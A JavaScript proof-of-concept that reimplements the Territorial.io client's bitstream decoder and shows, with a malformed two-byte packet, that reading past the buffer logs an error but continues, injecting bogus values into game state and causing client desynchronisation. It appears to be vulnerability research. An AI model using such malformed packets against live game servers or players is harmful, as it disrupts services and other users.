/**
 * PoC 1: Bitstream Decoder Overflow / Desynchronization Vulnerability
 * Targets: Class d7 (Unwrapper) in Territorial.io client
 *
 * Vulnerability:
 * In d7.prototype.qS(size), when the requested bits exceed the payload buffer length,
 * the function logs `console.error("Unwrapper Overflow")` but DOES NOT throw, return null,
 * or terminate the packet processing loop.
 *
 * It proceeds to evaluate bitwise operations on undefined elements, causing NaN/0 injection
 * into memory arrays (ah.nM, troop counts, map seeds), creating deterministic desync.
 */

function Unwrapper() {
    this.size = 0;
    this.eG = 0;
    this.aD = null;
    this.errors = [];

    this.di = function(aD) {
        this.eG = 0;
        this.aD = aD;
        this.size = aD.length;
    };

    this.qS = function(size) {
        var aC;
        var ft = 0;
        var aD = this.aD;
        var o5 = this.eG + size - 1;

        if (this.eG + size > 8 * this.size) {
            this.errors.push(`[OVERFLOW] Read out of bounds: offset ${this.eG} + ${size} bits > ${8 * this.size} total bits`);
        }

        for (aC = this.eG; aC <= o5; aC++) {
            // If aC >> 3 exceeds byte array length, aD[...] is undefined.
            var byteVal = aD[aC >> 3] || 0;
            ft |= ((byteVal >> (7 - (aC & 7))) & 1) << (o5 - aC);
        }
        this.eG += size;
        return ft;
    };
}

// Test harness
console.log("=== Testing Bitstream Buffer Boundary Underflow/Overflow ===");
const unwrapper = new Unwrapper();

// Packet with only 2 bytes (16 bits)
const malformedPacket = new Uint8Array([0x41, 0x42]);
unwrapper.di(malformedPacket);

console.log("[*] Reading valid 6-bit opcode:", unwrapper.qS(6));
console.log("[*] Reading valid 10-bit value:", unwrapper.qS(10));
console.log("[!] Attempting to read 30-bit coordinate payload from exhausted stream...");
const outOfBoundsValue = unwrapper.qS(30);

console.log("[+] Result returned by engine:", outOfBoundsValue);
console.log("[+] Errors trapped:", unwrapper.errors);
console.log("[!] Flaw Confirmed: Function silently proceeded instead of aborting transaction.");
